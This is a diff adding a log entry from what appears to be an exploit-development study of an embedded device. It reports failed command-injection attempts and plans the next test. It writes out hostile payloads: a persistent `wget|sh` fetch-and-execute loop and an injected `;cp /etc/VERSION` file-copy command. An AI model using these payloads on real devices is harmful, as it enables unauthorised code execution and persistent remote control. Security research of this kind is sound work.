@@ -1926,3 +1926,25 @@ if exec works at all. That fire is the next session's first action.
 Also verified tonight: the 65130/57.23 chroot replay reaches the exact
 verdict point (all gates pass except the fake-proc hw-set — which the real
 unit supplies); the .84 refusal is NOT the compat check.
+
+### 2026-11-06 (session 10 cont.) — the LOOP discriminator verdict + the duel execution results
+
+The consensus #1/#2 fires executed with clean instrumentation:
+- **S1 LOOP fire** (FN=0x105464B0, `(while:do wget|sh;sleep 15;done)&` at
+  node200+4): fire 200/200 → unit REBOOTED (96s watchdog) → **ZERO beacon
+  hits** across the 300s window spanning the reboot. The persistent loop
+  never ran.
+- **S2 SYSPLT fire** (FN=0x6DCEA0 stub, beacon-first cmd at a FRESH
+  calibrated hit 0x70c000): 200/200 → reboot (97s) → zero beacon, no 2323.
+
+THE COMPLETE EXECUTION MODEL (all evidence): the FN call happens (reboot =
+watchdog on the blocked notify thread); our node-buffer bytes are NOT
+reaching system() as the command on either architecture in the post-reboot
+lifetimes. Two candidates remain: (a) the a0/r3-at-call points elsewhere
+(the observer struct, not node0/node200 — the original matrix-era inference
+may not hold in current lifetimes), or (b) the child env kills wget before
+its first packet. The NEXT discriminator (per the duel): run the child with
+a NON-network observable — e.g. `;cp /etc/VERSION /jffs/system/VERSION2`
+then read via the S1 /jffs file-read (the S2 has none; the S1 status table
+has /jffs/VERSION in its strings) — a pure file-write test with no socket,
+no wget. That fire distinguishes (a) from (b) definitively.
